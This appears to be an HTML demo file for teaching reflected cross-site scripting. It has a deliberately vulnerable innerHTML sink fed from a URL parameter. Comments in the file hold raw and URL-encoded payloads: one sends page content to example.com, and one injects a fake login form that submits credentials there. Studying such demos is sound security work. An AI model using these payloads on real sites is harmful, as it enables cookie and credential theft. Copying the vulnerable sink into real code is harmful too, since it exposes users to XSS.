<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Example</title>
</head>
<body>
    
    <!-- Vulnerable Code -->
     <div>
        Welcome, <span id="username"></span>!
     </div>





     <script>
         //function to set a cookie,  (mostly this will be set by the server)
        function setCookie(name, value, days) {
           const date = new Date();
           date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
           const expires = "expires=" + date.toUTCString();
           document.cookie = name + "=" + value + ";" + expires + ";path=/";
        }

        //Example: Set a cookie named "exampleCookie" with a value of "Hello, Cookie" that expires in 7 days
        setCookie("exampleCookie", "Hello, Cookie!", 7);

     </script>


    <!-- Vulnerable Code -->

    <script>    
        const params = new URLSearchParams(window.location.search);
        const name = params.get('name');
        document.getElementById('username').innerHTML = name;
    </script>




    <!-- 

      -- Stealing Critical Information  

            -- ?name= something like this 

            <img src="empty.gif" onerror="var mycookie=document.cookie; new Image().src=`https://example.com/fakepage.php?output=${document.body.innerHTML}`;"/>



            -- encodedURIComponent(img-tag)

                    %3Cimg%20src%3D%22empty.gif%22%20onerror%3D%22var%20mycookie%3Ddocument.cookie%3B%20new%20Image().src%3D%60https%3A%2F%2Fexample.com%2Ffakepage.php%3Foutput%3D%24%7Bdocument.body.innerHTML%7D%60%3B%22%2F%3E
            
            ?name=encodedURIComponent(img-tag)

    -->


    <!-- 
    
    -- Phising Attacks

        -- let's take a form and and take a encodedURIComponent of the form and pass it to the ?name= parameter


        <h3>Please login to proceed</h3>
        <form action=http://example.com/fakepage.php>
            Username:<br><input type="username" name="username">
            </br>
            Password:<br>
            <input type="password"  name="password">
            </br>
            <br>
            <input type="submit" value="Login">
            </br>
        </form>


        --encodedURIComponent(form)

                %3Ch3%3EPlease%20login%20to%20proceed%3C%2Fh3%3E%0A%20%20%20%20%20%20%20%20%3Cform%20action%3Dhttp%3A%2F%2Fexample.com%2Ffakepage.php%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20Username%3A%3Cbr%3E%3Cinput%20type%3D%22username%22%20name%3D%22username%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20Password%3A%3Cbr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22password%22%20%20name%3D%22password%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cbr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbr%3E%0A%20%20%20%20%20%20%20%20%3C%2Fform%3E
    
        place this in parameter of ?name=
        and hit enter, you get a form, fill that and press the submit button (we can observe the credentials in the fakepage.php header)
    -->


</body>
</html>